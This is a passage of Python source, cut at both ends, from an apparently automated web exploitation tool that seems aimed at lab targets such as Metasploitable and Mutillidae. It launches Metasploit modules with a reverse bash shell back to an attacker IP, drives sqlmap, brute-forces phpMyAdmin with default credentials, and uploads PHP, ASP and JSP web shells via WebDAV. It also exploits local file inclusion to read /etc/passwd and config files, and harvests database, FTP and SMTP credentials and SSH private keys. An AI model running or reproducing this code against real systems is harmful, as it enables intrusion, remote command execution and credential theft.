        if response.status_code == 200 and len(response.text) > 50:
            poc = f"curl -H 'Host: {vhost}' {base_url}"
            proof = f"Virtual host accessible: {vhost}"
            return True, proof, poc, {"url": base_url, "vhost": vhost, "content": response.text}
    except Exception as e:
        logger.error(f"Virtual host test failed: {e}")
    
    return False, "", f"curl -H 'Host: {vhost}' {base_url}", {}

def test_dns_record(record: str) -> Tuple[bool, str, str, Dict]:
    """Test DNS record for vulnerabilities."""
    logger.info(f"Testing DNS record: {record}")
    
    try:
        # Basic DNS record validation
        if ":" in record and any(port in record for port in ["80", "443", "8080"]):
            poc = f"nslookup {record}"
            proof = f"DNS record found: {record}"
            return True, proof, poc, {"record": record}
    except Exception as e:
        logger.error(f"DNS record test failed: {e}")
    
    return False, "", f"nslookup {record}", {}

def test_metasploit_http_exploits_with_recon(target: str, port: str, attacker_ip: str, attacker_port: str, metadata: Dict) -> List[Dict]:
    """Test Metasploit HTTP exploits using reconnaissance data."""
    exploits = []
    
    # Use recon data to determine appropriate modules
    http_banner = metadata.get("http_banner", "")
    https_banner = metadata.get("https_banner", "")
    outdated_software = metadata.get("outdated_software", [])
    exploitable_versions = metadata.get("exploitable_versions", {})
    
    # Common HTTP exploit modules (limited to most common) - msf6 names
    http_modules = [
        "exploit/multi/http/php_cgi_arg_injection",
        "exploit/unix/webapp/php_include"
    ]
    
    # Add version-specific modules based on recon (limited)
    exploitable_versions = metadata.get("exploitable_versions", {})
    for software, modules in exploitable_versions.items():
        if modules and modules != ["none"]:
            # Only add first 2 modules to avoid timeouts
            http_modules.extend(modules[:2])
    
    # Remove duplicates and limit total modules
    http_modules = list(set(http_modules))[:3]  # Limit to 3 modules max
    
    for module in http_modules:
        logger.info(f"Testing Metasploit module: {module}")
        success, poc = run_metasploit_exploit(module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port)
        
        if success:
            exploits.append({
                "type": f"Metasploit {module.split('/')[-1]}",
                "target": f"{target}:{port}",
                "details": f"Successfully exploited with {module}",
                "poc": poc,
                "proof": "Metasploit session established"
            })
            # Stop after first successful exploit to save time
            break
    
    return exploits

def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the most relevant HTTP metadata file for the target.

    Preference order:
    1) Exact file: {target}_http_metadata.json (rich combined recon)
    2) Largest HTTP metadata file by size
    3) Any metadata file
    """
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_*_metadata.json"))
    if not metadata_files:
        raise FileNotFoundError(f"No metadata files found for {target}")

    # Prefer exact HTTP metadata file
    exact_http = OUTPUT_DIR / f"{target}_http_metadata.json"
    if exact_http.exists():
        return exact_http, "http"

    # Fallback: choose largest HTTP-related metadata file
    http_candidates = [f for f in metadata_files if "http" in f.name.lower()]
    if http_candidates:
        largest_http = max(http_candidates, key=lambda p: p.stat().st_size)
        return largest_http, "http"

    # Last resort: largest metadata file of any type
    largest_any = max(metadata_files, key=lambda p: p.stat().st_size)
    return largest_any, "unknown"

def find_login_form(url: str) -> Tuple[object, Dict, str]:
    """Find login forms on a webpage and return form, cookies, and URL."""
    try:
        r = requests.get(url, timeout=5, verify=False)
    except:
        return None, {}, ""

    soup = BeautifulSoup(r.text, "html.parser")
    forms = soup.find_all("form")
    for form in forms:
        inputs = form.find_all("input")
        input_names = [i.get("name") for i in inputs if i.get("name")]
        if any("user" in (name or "").lower() or "email" in (name or "").lower() for name in input_names) \
           and any("pass" in (name or "").lower() for name in input_names):
            return form, r.cookies.get_dict(), r.url
    return None, {}, ""

def build_request_file(form: object, cookies: Dict, page_url: str, target: str) -> Tuple[str, List[str]]:
    """Build a request file for sqlmap testing."""
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all("input")

    # Prepare post data with test values
    data_pairs = []
    for inp in inputs:
        name = inp.get("name")
        if not name:
            continue
        if "user" in name.lower() or "email" in name.lower():
            value = "admin"
        elif "pass" in name.lower():
            value = "admin"
        else:
            value = inp.get("value", "")
        data_pairs.append(f"{name}={value}")
    post_data = "&".join(data_pairs)

    target_path = urllib.parse.urljoin(page_url, action)
    host = target_path.split("/")[2]
    
    req_content = f"""POST {target_path.replace('http://'+host, '')} HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Cookie: {"; ".join(f"{k}={v}" for k, v in cookies.items())}

{post_data}
"""
    req_file = OUTPUT_DIR / f"{target}_login.req"
    with req_file.open("w") as f:
        f.write(req_content)
    
    params = [name for name, _ in (i.split("=") for i in data_pairs) if "user" in name.lower() or "email" in name.lower()]
    return str(req_file), params

def test_login_form_sql_injection(base_url: str, target: str) -> Tuple[bool, str, str, Dict]:
    """Test login forms for SQL injection using the smart detection method."""
    logger.info(f"Testing login forms for SQL injection on {base_url}")
    
    # Find login form
    form, cookies, page_url = find_login_form(base_url)
    if not form:
        logger.info("No login form found")
        return False, "", "", {}
    
    logger.info(f"Login form found at {page_url}")
    
    # Build request file
    req_file, params = build_request_file(form, cookies, page_url, target)
    logger.info(f"Request file created: {req_file}, testing parameters: {params}")
    
    # Test each parameter with sqlmap
    successful_injections = []
    for param in params:
        sqlmap_cmd = [
            "sqlmap", "-r", req_file, "-p", param,
            "--risk=3", "--level=5", "--batch",
            "--random-agent", "--timeout=15", "--threads=1"
        ]
        
        output, success = run_command(sqlmap_cmd, timeout=None)
        text = (output or "").lower()
        
        # Check for successful injection
        if success and any(s in text for s in [
            "parameter is vulnerable", "is injectable", "the back-end dbms is",
            "injection point found", "vulnerable to"
        ]):
            successful_injections.append({
                "parameter": param,
                "url": page_url,
                "output": output[:1000]
            })
    
    if successful_injections:
        proof = f"SQL injection found in login form parameters: {[s['parameter'] for s in successful_injections]}"
        poc = f"sqlmap -r {req_file} -p {' '.join([s['parameter'] for s in successful_injections])} --risk=3 --level=5"
        evidence = {
            "type": "login_form_sql_injection",
            "form_url": page_url,
            "vulnerable_parameters": [s['parameter'] for s in successful_injections],
            "sqlmap_output": successful_injections[0]['output'],
            "request_file": req_file
        }
        return True, proof, poc, evidence
    
    return False, "", "", {}

def test_phpmyadmin_access(base_url: str, target: str) -> Tuple[bool, str, str, Dict]:
    """Test phpMyAdmin access with credential testing and SQLi enumeration via sqlmap.

    Returns success if either access or SQLi enumeration succeeds. Evidence includes db list if SQLi works.
    """
    logger.info(f"Testing phpMyAdmin access on {base_url}")
    
    phpmyadmin_urls = [
        f"{base_url}/phpMyAdmin/",
        f"{base_url}/phpmyadmin/",
        f"{base_url}/phpMyAdmin/index.php",
        f"{base_url}/phpmyadmin/index.php",
        f"{base_url}/pma/",
        f"{base_url}/dbadmin/"
    ]
    
    # Common phpMyAdmin credentials for Metasploitable/vulnerable systems
    credentials = [
        ("root", ""),
        ("root", "root"),
        ("admin", "admin"),
        ("admin", ""),
        ("mysql", "mysql"),
        ("phpmyadmin", "phpmyadmin"),
        ("test", "test"),
        ("guest", "guest"),
        ("user", "user"),
        ("db", "db"),
        ("database", "database"),
        ("msfadmin", "msfadmin")  # Metasploitable default
    ]
    
    successful_access = []
    evidence_data = {
        "type": "phpmyadmin_access",
        "successful_logins": [],
        "database_info": [],
        "system_info": {},
        "privilege_info": {}
    }
    
    for url in phpmyadmin_urls:
        try:
            # Normalize to a login page URL and fetch fresh for token
            login_url = url if url.endswith("/") or url.endswith("index.php") else f"{url.rstrip('/')}/index.php"
            response = requests.get(login_url, timeout=10, verify=False)
            if response.status_code == 200 and ("phpmyadmin" in response.text.lower() or "mysql" in response.text.lower()):
                logger.info(f"phpMyAdmin found at {login_url}")
                
                # Test credentials
                for username, password in credentials:
                    # Extract token and form action
                    token_match = re.search(r'name="token"\s+value="([^"]+)"', response.text, re.IGNORECASE)
                    action_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
                    token_val = token_match.group(1) if token_match else ""
                    action_path = action_match.group(1) if action_match else "index.php"

                    login_data_variants = [
                        {"pma_username": username, "pma_password": password, "server": "1", "target": "index.php", "token": token_val},
                        {"input_username": username, "input_password": password, "server": "1", "target": "index.php", "token": token_val},
                        {"username": username, "password": password, "server": "1", "target": "index.php", "token": token_val},
                    ]
                    
                    try:
                        # Try each variant
                        login_response = None
                        for login_data in login_data_variants:
                            try:
                                post_url = urllib.parse.urljoin(login_url, action_path)
                                login_response = requests.post(post_url, data=login_data, timeout=10, verify=False, allow_redirects=True)
                                if login_response is not None and login_response.status_code in (200, 302):
                                    break
                            except Exception:
                                continue
                        
                        # Check for successful login
                        if (login_response.status_code == 200 and 
                            ("database" in login_response.text.lower() or 
                             "logout" in login_response.text.lower() or
                             "mysql" in login_response.text.lower()) and
                            "error" not in login_response.text.lower() and
                            "denied" not in login_response.text.lower()):
                            
                            logger.info(f"Successful phpMyAdmin login: {username}:{password}")
                            
                            # Best-effort extraction (may be empty)
                            databases = re.findall(r'\[\*\]\s+([\w\-]+)', login_response.text)
                            tables = re.findall(r'\[\*\]\s+([\w\-]+)\.([\w\-]+)', login_response.text)
                            version_match = re.search(r'MySQL\s+(\d+\.\d+\.\d+)', (login_response.text or ""))
                            mysql_version = version_match.group(1) if version_match else "unknown"
                            
                            successful_access.append({
                                "url": url,
                                "username": username,
                                "password": password,
                                "databases": databases[:10],  # Limit output
                                "tables": tables[:20],
                                "mysql_version": mysql_version
                            })
                            
                            evidence_data["successful_logins"].append({
                                "url": url,
                                "credentials": f"{username}:{password}",
                                "mysql_version": mysql_version
                            })
                            evidence_data["database_info"].extend(databases[:10])
                            evidence_data["system_info"]["mysql_version"] = mysql_version
                            
                            # SQLi enumeration with sqlmap using request file (-r) to prove DBs
                            try:
                                # Build request file for sqlmap using the last attempted login_data
                                host = urllib.parse.urlparse(post_url).netloc
                                req_content = f"POST {urllib.parse.urlparse(post_url).path} HTTP/1.1\n" \
                                              f"Host: {host}\n" \
                                              f"User-Agent: Mozilla/5.0\n" \
                                              f"Content-Type: application/x-www-form-urlencoded\n" \
                                              f"Accept: */*\n" \
                                              f"Cookie: {'; '.join(f'{k}={v}' for k, v in login_response.cookies.get_dict().items())}\n\n" \
                                              f"{urllib.parse.urlencode(login_data)}\n"
                                req_file = OUTPUT_DIR / f"{target}_phpmyadmin_login.req"
                                with req_file.open("w") as rf:
                                    rf.write(req_content)

                                sqlmap_cmd = [
                                    "sqlmap", "-r", str(req_file), "-p", "pma_username,pma_password,username,password",
                                    "--risk=3", "--level=5", "--batch", "--random-agent", "--timeout", "60", "--threads", "1",
                                    "--dbs", "--current-db"
                                ]
                                output, _ = run_command(sqlmap_cmd, timeout=None)
                                text = (output or "")
                                dbs = re.findall(r"^\[\*\]\s+([\w\-]+)$", text, re.MULTILINE)
                                if dbs:
                                    evidence_data["sqlmap_databases"] = sorted(list(set(dbs)))
                                    evidence_data["sqlmap_output"] = output[-2000:]
                                    successful_access[-1]["enumerated_databases"] = evidence_data["sqlmap_databases"]
                                    logger.info(f"phpMyAdmin SQLi enumeration found databases: {evidence_data['sqlmap_databases']}")
                            except Exception as e:
                                logger.debug(f"phpMyAdmin sqlmap enumeration failed: {e}")
                            
                            break  # Stop testing credentials for this URL
                            
                    except Exception as e:
                        logger.debug(f"Login attempt failed for {username}:{password} - {e}")
                        continue
                
                if successful_access:
                    break  # Stop testing URLs if we found access
                    
        except Exception as e:
            logger.debug(f"Could not access {url} - {e}")
            continue
    
    if successful_access:
        creds_str = ", ".join([f"{a['username']}:{a['password']}" for a in successful_access])
        proof = f"phpMyAdmin access gained with credentials: {creds_str}"
        poc = f"Access phpMyAdmin at {successful_access[0]['url']} with {successful_access[0]['username']}:{successful_access[0]['password']}"
        
        # Generate post-exploitation metadata
        evidence_data["post_exploit_opportunities"] = {
            "database_enumeration": True,
            "user_data_access": True,
            "configuration_access": True,
            "file_upload_via_sql": len(successful_access) > 0,
            "privilege_escalation": True if evidence_data["successful_logins"] else False
        }
        
        return True, proof, poc, evidence_data
    
    return False, "", f"Test phpMyAdmin access at {base_url}/phpMyAdmin/", {}

def extract_phpinfo_intelligence(url: str, target: str) -> Tuple[bool, str, str, Dict]:
    """Extract comprehensive intelligence from phpinfo.php for post-exploitation."""
    logger.info(f"Extracting phpinfo intelligence from {url}")
    
    try:
        response = requests.get(url, timeout=10, verify=False)
        if response.status_code != 200 or "phpinfo" not in response.text.lower():
            return False, "", f"curl {url}", {}
        
        content = response.text
        intelligence = {
            "type": "phpinfo_intelligence",
            "system_info": {},
            "php_config": {},
            "security_info": {},
            "file_paths": {},
            "database_info": {},
            "post_exploit_vectors": {}
        }
        
        # Extract system information
        system_patterns = {
            "os": r"System\s*</td><td[^>]*>([^<]+)",
            "hostname": r"SERVER_NAME\s*</td><td[^>]*>([^<]+)",
            "document_root": r"DOCUMENT_ROOT\s*</td><td[^>]*>([^<]+)",
            "server_software": r"SERVER_SOFTWARE\s*</td><td[^>]*>([^<]+)",
            "php_version": r"PHP Version\s*([0-9.]+)",
            "server_admin": r"SERVER_ADMIN\s*</td><td[^>]*>([^<]+)"
        }
        
        for key, pattern in system_patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                intelligence["system_info"][key] = match.group(1).strip()
        
        # Extract critical file paths
        path_patterns = {
            "include_path": r"include_path\s*</td><td[^>]*>([^<]+)",
            "extension_dir": r"extension_dir\s*</td><td[^>]*>([^<]+)",
            "upload_tmp_dir": r"upload_tmp_dir\s*</td><td[^>]*>([^<]+)",
            "session_save_path": r"session.save_path\s*</td><td[^>]*>([^<]+)",
            "error_log": r"error_log\s*</td><td[^>]*>([^<]+)"
        }
        
        for key, pattern in path_patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                intelligence["file_paths"][key] = match.group(1).strip()
        
        # Extract security-relevant configuration
        security_patterns = {
            "allow_url_fopen": r"allow_url_fopen\s*</td><td[^>]*>([^<]+)",
            "allow_url_include": r"allow_url_include\s*</td><td[^>]*>([^<]+)",
            "display_errors": r"display_errors\s*</td><td[^>]*>([^<]+)",
            "file_uploads": r"file_uploads\s*</td><td[^>]*>([^<]+)",
            "register_globals": r"register_globals\s*</td><td[^>]*>([^<]+)",
            "safe_mode": r"safe_mode\s*</td><td[^>]*>([^<]+)",
            "open_basedir": r"open_basedir\s*</td><td[^>]*>([^<]+)",
            "disable_functions": r"disable_functions\s*</td><td[^>]*>([^<]+)"
        }
        
        for key, pattern in security_patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                value = match.group(1).strip()
                intelligence["security_info"][key] = value
        
        # Extract database information
        db_patterns = {
            "mysql_default_host": r"mysql.default_host\s*</td><td[^>]*>([^<]+)",
            "mysql_default_user": r"mysql.default_user\s*</td><td[^>]*>([^<]+)",
            "mysql_default_password": r"mysql.default_password\s*</td><td[^>]*>([^<]+)"
        }
        
        for key, pattern in db_patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                intelligence["database_info"][key] = match.group(1).strip()
        
        # Identify post-exploitation vectors
        vectors = {}
        
        # Check for dangerous functions
        disabled_functions = intelligence["security_info"].get("disable_functions", "")
        dangerous_functions = ["exec", "system", "shell_exec", "passthru", "eval", "file_get_contents", "file_put_contents"]
        available_functions = [func for func in dangerous_functions if func not in disabled_functions.lower()]
        vectors["available_dangerous_functions"] = available_functions
        
        # Check for file upload capabilities
        if intelligence["security_info"].get("file_uploads", "").lower() == "on":
            vectors["file_upload_enabled"] = True
            vectors["upload_max_filesize"] = re.search(r"upload_max_filesize\s*</td><td[^>]*>([^<]+)", content)
            if vectors["upload_max_filesize"]:
                vectors["upload_max_filesize"] = vectors["upload_max_filesize"].group(1).strip()
        
        # Check for include vulnerabilities
        if intelligence["security_info"].get("allow_url_include", "").lower() == "on":
            vectors["remote_file_inclusion"] = True
        
        if intelligence["security_info"].get("allow_url_fopen", "").lower() == "on":
            vectors["remote_file_access"] = True
        
        # Check for register_globals vulnerability
        if intelligence["security_info"].get("register_globals", "").lower() == "on":
            vectors["register_globals_vuln"] = True
        
        intelligence["post_exploit_vectors"] = vectors
        
        # Generate proof and evidence
        proof_items = []
        if intelligence["system_info"]:
            proof_items.append(f"System: {intelligence['system_info'].get('os', 'unknown')}")
        if intelligence["file_paths"]:
            proof_items.append(f"Document Root: {intelligence['file_paths'].get('document_root', 'unknown')}")
        if available_functions:
            proof_items.append(f"Dangerous functions available: {', '.join(available_functions[:3])}")
        
        proof = f"phpinfo.php intelligence gathered: {'; '.join(proof_items)}"
        poc = f"curl {url} | grep -E '(System|DOCUMENT_ROOT|disable_functions)'"
        
        # Save detailed intelligence to file
        intelligence_file = OUTPUT_DIR / f"{target}_phpinfo_intelligence.json"
        with intelligence_file.open("w") as f:
            json.dump(intelligence, f, indent=2)
        
        return True, proof, poc, intelligence
        
    except Exception as e:
        logger.error(f"Failed to extract phpinfo intelligence: {e}")
        return False, "", f"curl {url}", {}

def test_webdav_exploitation(base_url: str, dav_path: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str, str, Dict]:
    """Test WebDAV for file upload and exploitation capabilities."""
    logger.info(f"Testing WebDAV exploitation on {base_url}{dav_path}")
    
    webdav_url = f"{base_url}{dav_path}"
    evidence = {
        "type": "webdav_exploitation",
        "methods_allowed": [],
        "upload_success": False,
        "shell_access": False,
        "file_listing": [],
        "authentication_bypass": False
    }
    
    try:
        # Test HTTP methods
        methods_to_test = ["OPTIONS", "PROPFIND", "PUT", "MOVE", "COPY", "DELETE", "MKCOL"]
        allowed_methods = []
        
        for method in methods_to_test:
            try:
                response = requests.request(method, webdav_url, timeout=10, verify=False)
                if response.status_code not in [405, 501]:  # Method not allowed or not implemented
                    allowed_methods.append(method)
                    logger.info(f"WebDAV method {method} is allowed")
            except:
                continue
        
        evidence["methods_allowed"] = allowed_methods
        
        if not allowed_methods:
            return False, "", f"curl -X OPTIONS {webdav_url}", evidence
        
        # Test PROPFIND for directory listing
        if "PROPFIND" in allowed_methods:
            try:
                propfind_data = '''<?xml version="1.0" encoding="utf-8"?>
<D:propfind xmlns:D="DAV:">
    <D:prop>
        <D:displayname/>
        <D:getlastmodified/>
        <D:getcontentlength/>
    </D:prop>
</D:propfind>'''
                
                headers = {
                    "Content-Type": "application/xml",
                    "Depth": "1"
                }
                
                response = requests.request("PROPFIND", webdav_url, data=propfind_data, headers=headers, timeout=10, verify=False)
                if response.status_code == 207:  # Multi-status
                    files = re.findall(r'<D:displayname>([^<]+)</D:displayname>', response.text)
                    evidence["file_listing"] = files[:20]  # Limit output
                    logger.info(f"WebDAV directory listing successful: {len(files)} files found")
            except Exception as e:
                logger.debug(f"PROPFIND failed: {e}")
        
        # Test file upload with PUT
        if "PUT" in allowed_methods:
            # Test with various file extensions
            test_files = [
                ("test.txt", "text/plain", "WebDAV test file"),
                ("shell.php", "application/x-php", f"<?php system($_GET['cmd']); ?>"),
                ("shell.asp", "text/plain", "<%eval request(\"cmd\")%>"),
                ("shell.jsp", "text/plain", "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>")
            ]
            
            uploaded_files = []
            for filename, content_type, content in test_files:
                try:
                    upload_url = f"{webdav_url}/{filename}"
                    headers = {"Content-Type": content_type}
                    
                    response = requests.put(upload_url, data=content, headers=headers, timeout=10, verify=False)
                    
                    if response.status_code in [200, 201, 204]:  # Success codes
                        logger.info(f"Successfully uploaded {filename} via WebDAV")
                        uploaded_files.append(filename)
                        evidence["upload_success"] = True
                        
                        # Test if uploaded file is accessible and executable
                        if filename.endswith('.php'):
                            # Verify within the DAV path
                            test_url = f"{webdav_url}/{filename}?cmd=id"
                            try:
                                exec_response = requests.get(test_url, timeout=5, verify=False)
                                if "uid=" in exec_response.text:
                                    evidence["shell_access"] = True
                                    logger.info(f"Shell access confirmed via {filename}")
                                    break
                            except:
                                pass
                        
                except Exception as e:
                    logger.debug(f"Upload failed for {filename}: {e}")
                    continue
            
            evidence["uploaded_files"] = uploaded_files
        
        # Generate proof and POC
        if evidence["upload_success"] or evidence["file_listing"]:
            proof_items = []
            if evidence["methods_allowed"]:
                proof_items.append(f"Methods: {', '.join(evidence['methods_allowed'])}")
            if evidence["upload_success"]:
                proof_items.append("File upload successful")
            if evidence["shell_access"]:
                proof_items.append("Shell access achieved")
            if evidence["file_listing"]:
                proof_items.append(f"Directory listing: {len(evidence['file_listing'])} files")
            
            proof = f"WebDAV exploitation successful: {'; '.join(proof_items)}"
            
            if evidence["shell_access"]:
                poc = f"curl -X PUT {webdav_url}/shell.php -d '<?php system($_GET[\"cmd\"]); ?>' && curl {base_url}/shell.php?cmd=id"
            else:
                poc = f"curl -X PUT {webdav_url}/test.txt -d 'test' && curl -X PROPFIND {webdav_url}"
            
            return True, proof, poc, evidence
    
    except Exception as e:
        logger.error(f"WebDAV testing failed: {e}")
    
    return False, "", f"curl -X OPTIONS {webdav_url}", evidence

def test_header_xss_reflection(url: str) -> Tuple[bool, str, str, Dict]:
    """Test header-based reflection XSS via Referer/User-Agent."""
    try:
        payload = "<script>alert(1337)</script>"
        response = requests.get(url, timeout=8, verify=False, headers={
            "Referer": payload,
            "User-Agent": payload
        })
        if payload in response.text:
            proof = f"Header-based XSS reflection on {url} via Referer/User-Agent"
            poc = f"curl -H 'Referer: {payload}' -A '{payload}' '{url}'"
            return True, proof, poc, {"payload": payload, "url": url}
    except Exception:
        pass
    return False, "", f"curl -H 'Referer: <payload>' -A '<payload>' '{url}'", {}

def test_cookie_toggle_features(url: str) -> Tuple[bool, str, str, Dict]:
    """Test cookie-based feature toggles (uid/hints-enabled)."""
    try:
        r1 = requests.get(url, timeout=8, verify=False)
        size1 = len(r1.text)
        cookies = {"uid": "1", "hints-enabled": "1", "show-hints": "1"}
        r2 = requests.get(url, timeout=8, verify=False, cookies=cookies)
        size2 = len(r2.text)
        if abs(size2 - size1) >= 200 or ("Hints" in r2.text and "Hints" not in r1.text):
            proof = f"Cookie-based feature toggle on {url}: size {size1} -> {size2}"
            poc = f"curl -H 'Cookie: uid=1; hints-enabled=1; show-hints=1' '{url}'"
            return True, proof, poc, {"size_no_cookie": size1, "size_with_cookie": size2}
    except Exception:
        pass
    return False, "", f"curl -H 'Cookie: uid=1; hints-enabled=1' '{url}'", {}

def test_mutillidae_lfi(base_url: str) -> Tuple[bool, str, str, Dict]:
    """Test typical Mutillidae LFI endpoints."""
    endpoints = [
        ("/mutillidae/arbitrary-file-inclusion.php", ["page", "file", "filename", "include", "path"]),
        ("/mutillidae/text-file-viewer.php", ["filename"]),
        ("/mutillidae/source-viewer.php", ["page"]) ,
    ]
    targets = ["../../../../etc/passwd%00", "../../../../etc/passwd"]
    for ep, params in endpoints:
        for param in params:
            for t in targets:
                url = f"{base_url}{ep}?{param}={t}"
                try:
                    r = requests.get(url, timeout=8, verify=False)
                    if "root:" in r.text:
                        proof = f"LFI confirmed on {ep} via {param}"
                        poc = f"curl '{url}'"
                        snippet = "\n".join([line for line in r.text.splitlines() if line.startswith("root:")][:3])
                        return True, proof, poc, {"endpoint": ep, "parameter": param, "snippet": snippet}
                except Exception:
                    continue
    return False, "", "", {}

def test_quick_sqli_error(url: str) -> Tuple[bool, str, str, Dict]:
    """Quick error-based SQLi probe by appending a single-quote to a parameter value."""
    try:
        r = requests.get(url, timeout=8, verify=False)
        text = r.text.lower()
        if any(k in text for k in ["sql", "mysql", "warning", "error", "syntax"]):
            proof = f"Possible SQL error reflection at {url}"
            poc = f"curl '{url}'"
            return True, proof, poc, {"url": url}
    except Exception:
        pass
    return False, "", f"curl '{url}'", {}

def test_mutillidae_post_sqli(base_url: str) -> List[Dict]:
    """Targeted POST-based SQLi tests on common Mutillidae forms.

    Returns list of confirmed or strong-indicator SQLi findings with PoCs.
    """
    findings: List[Dict] = []
    payloads = ["' OR '1'='1", "'-- -", "' ) OR ( '1'='1"]
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    targets = [
        {
            "path": "/mutillidae/add-to-your-blog.php",
            "fields": ["entry", "title"],
        },
        {
            "path": "/mutillidae/login.php",
            "fields": ["username", "password"],
        },
        {
            "path": "/mutillidae/process-login-attempt.php",
            "fields": ["username", "password"],
        },
        {
            "path": "/mutillidae/user-info.php",
            "fields": ["username"],
        },
    ]

    for t in targets:
        url = f"{base_url}{t['path']}"
        for field in t["fields"]:
            for payload in payloads:
                try:
                    data = {f: (payload if f == field else "test") for f in t["fields"]}
                    r = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
                    txt = r.text.lower()
                    if any(k in txt for k in ["sql", "mysql", "warning", "error", "syntax"]):
                        poc = f"curl -X POST '{url}' --data '{urllib.parse.urlencode(data)}'"
                        findings.append({
                            "type": "SQL Injection (POST - Error-based)",
                            "url": url,
                            "parameter": field,
                            "poc": poc,
                            "evidence": "SQL error indicators present"
                        })
                        break
                except Exception:
                    continue
    return findings

def test_mutillidae_lfi_configs(base_url: str) -> Tuple[bool, str, str, Dict]:
    """Attempt to read Mutillidae configuration files via LFI endpoints to extract DB credentials."""
    candidates = [
        f"{base_url}/mutillidae/arbitrary-file-inclusion.php?page=../../../../var/www/mutillidae/includes/database-config.inc%00",
        f"{base_url}/mutillidae/arbitrary-file-inclusion.php?page=../../../../var/www/mutillidae/includes/config.inc%00",
        f"{base_url}/mutillidae/text-file-viewer.php?filename=../../../../var/www/mutillidae/includes/database-config.inc",
        f"{base_url}/mutillidae/source-viewer.php?page=../../../../var/www/mutillidae/includes/database-config.inc",
    ]
    for url in candidates:
        try:
            r = requests.get(url, timeout=10, verify=False)
            if r.status_code == 200:
                m_user = re.search(r"db[_-]?user\s*['\"]?\s*[:=]\s*['\"]([^'\"]+)", r.text, re.IGNORECASE)
                m_pass = re.search(r"db[_-]?pass\w*\s*['\"]?\s*[:=]\s*['\"]([^'\"]+)", r.text, re.IGNORECASE)
                m_host = re.search(r"db[_-]?host\s*['\"]?\s*[:=]\s*['\"]([^'\"]+)", r.text, re.IGNORECASE)
                if m_user or m_pass or m_host:
                    creds = {
                        "db_user": m_user.group(1) if m_user else "unknown",
                        "db_pass": m_pass.group(1) if m_pass else "unknown",
                        "db_host": m_host.group(1) if m_host else "unknown",
                        "source_url": url,
                    }
                    proof = f"DB creds via LFI: user={creds['db_user']} host={creds['db_host']}"
                    poc = f"curl '{url}' | grep -Ei 'db(user|pass|host)'"
                    return True, proof, poc, creds
        except Exception:
            continue
    return False, "", "", {}

def harvest_credentials_from_files(discovered_endpoints: List[Dict], base_url: str) -> Tuple[bool, str, str, Dict]:
    """Harvest credentials from discovered sensitive files."""
    logger.info("Harvesting credentials from discovered sensitive files")
    
    evidence = {
        "type": "credential_harvesting",
        "discovered_credentials": [],
        "config_files": [],
        "backup_files": [],
        "database_configs": [],
        "ssh_keys": []
    }
    
    # Target sensitive files from reconnaissance
    sensitive_files = []
    for endpoint in discovered_endpoints:
        url = endpoint.get("url", "")
        if any(pattern in url.lower() for pattern in [".htpasswd", ".htaccess", "config", "backup", ".bak", ".old"]):
            sensitive_files.append(url)
    
    # Add common sensitive file paths
    common_sensitive = [
        "/.htpasswd",
        "/.htaccess", 
        "/config.php",
        "/wp-config.php",
        "/configuration.php",
        "/config.inc.php",
        "/settings.php",
        "/database.php",
        "/db.php",
        "/config.txt",
        "/backup.sql",
        "/dump.sql"
    ]
    
    for path in common_sensitive:
        sensitive_files.append(f"{base_url}{path}")
    
    found_credentials = []
    
    for file_url in sensitive_files[:20]:  # Limit testing
        try:
            response = requests.get(file_url, timeout=10, verify=False)
            if response.status_code == 200 and len(response.text) > 0:
                content = response.text
                
                # Extract different types of credentials
                
                # Database credentials
                db_patterns = [
                    r"(?:mysql_|db_)?(?:host|server)\s*[:=]\s*['\"]([^'\"]+)",
                    r"(?:mysql_|db_)?(?:user|username)\s*[:=]\s*['\"]([^'\"]+)",
                    r"(?:mysql_|db_)?(?:pass|password)\s*[:=]\s*['\"]([^'\"]+)",
                    r"(?:mysql_|db_)?(?:name|database)\s*[:=]\s*['\"]([^'\"]+)"
                ]
                
                for pattern in db_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if match and match not in ["localhost", "127.0.0.1", "", "password", "username"]:
                            found_credentials.append({
                                "type": "database",
                                "file": file_url,
                                "credential": match
                            })
                
                # Apache .htpasswd format
                htpasswd_pattern = r"([^:\s]+):([^:\s]+)"
                if ".htpasswd" in file_url.lower():
                    matches = re.findall(htpasswd_pattern, content)
                    for username, hash_val in matches:
                        found_credentials.append({
                            "type": "htpasswd",
                            "file": file_url,
                            "username": username,
                            "hash": hash_val
                        })
                
                # FTP credentials
                ftp_patterns = [
                    r"ftp[_\s]*(?:user|username)\s*[:=]\s*['\"]([^'\"]+)",
                    r"ftp[_\s]*(?:pass|password)\s*[:=]\s*['\"]([^'\"]+)",
                    r"ftp[_\s]*(?:host|server)\s*[:=]\s*['\"]([^'\"]+)"
                ]
                
                for pattern in ftp_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if match:
                            found_credentials.append({
                                "type": "ftp",
                                "file": file_url,
                                "credential": match
                            })
                
                # SSH keys
                if "BEGIN RSA PRIVATE KEY" in content or "BEGIN OPENSSH PRIVATE KEY" in content:
                    evidence["ssh_keys"].append({
                        "file": file_url,
                        "key_type": "RSA" if "RSA" in content else "OpenSSH"
                    })
                    found_credentials.append({
                        "type": "ssh_key",
                        "file": file_url,
                        "credential": "Private SSH key found"
                    })
                
                # Email credentials
                email_patterns = [
                    r"smtp[_\s]*(?:user|username)\s*[:=]\s*['\"]([^'\"]+)",
                    r"smtp[_\s]*(?:pass|password)\s*[:=]\s*['\"]([^'\"]+)",
                    r"mail[_\s]*(?:user|username)\s*[:=]\s*['\"]([^'\"]+)",
                    r"mail[_\s]*(?:pass|password)\s*[:=]\s*['\"]([^'\"]+)"
                ]
                
                for pattern in email_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
